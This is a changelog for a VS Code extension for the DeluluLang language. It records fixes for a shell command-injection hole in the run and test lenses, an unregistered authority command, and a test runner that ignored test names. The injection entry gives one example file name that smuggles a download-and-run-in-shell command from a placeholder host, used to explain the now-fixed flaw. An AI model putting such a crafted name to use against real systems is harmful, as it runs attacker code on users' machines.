# Changelog — DeluluLang for VS Code

The extension version tracks the workspace version; `editor_contract.rs` fails the build if they
drift apart.

## 1.0.0

Three defects were found by writing the first test that read the server and the client together.
None of them could fail a build before, because the server is Rust and the client is JavaScript and
nothing compared the two.

### Fixed

- **Command injection through the file path.** The run and test lenses built a shell command
  *string* — `` `${serverPath} run ${fsPath}` `` — and sent it to the user's shell. A file named
  `x;curl evil.sh|sh.delulu` executed on click, and, far more routinely, **any path containing a
  space ran the wrong command**. Paths come from editor tabs, so they are attacker-influenced the
  moment a project is opened from a clone. Commands now execute with an argument vector, which no
  shell parses.
- **`authority: {…}` did nothing.** The server has emitted this lens since Stage 8; no client ever
  registered the command, so clicking it raised *"command 'delulu.authority' not found"*. It now
  forwards to the server and opens the §10.5 authority report.
- **"▶ run test" ran every test in the file.** The server sends `[uri, testName]`; the client
  ignored the name. Running the whole file also surfaced failures from tests whose declared effect
  row the package ceiling refuses — failures the user never asked to see.

### Changed

- Version `0.8.0` → `1.0.0` and licence `MIT` → `Apache-2.0`, both to match the workspace this
  ships from. The MIT claim contradicted the `LICENSE` file beside it.
- All three commands are now declared in `contributes.commands`, so they appear in the Command
  Palette instead of existing only as lens targets.
